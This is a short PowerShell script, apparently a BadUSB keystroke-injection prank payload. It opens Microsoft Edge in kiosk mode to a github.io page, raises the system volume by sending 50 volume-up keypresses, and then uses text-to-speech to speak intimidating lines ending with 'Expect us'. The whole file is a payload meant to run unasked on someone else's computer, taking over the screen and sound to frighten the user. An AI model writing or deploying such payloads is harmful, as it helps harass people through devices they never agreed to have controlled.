Start-Process "msedge.exe" -ArgumentList "--kiosk https://kingtoad-c.github.io/bad-usb/
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("dont be afraid")
$s.Speak("just follow the rules")
$s.Speak("and everything will be okay")
$s.Speak("Expect us")
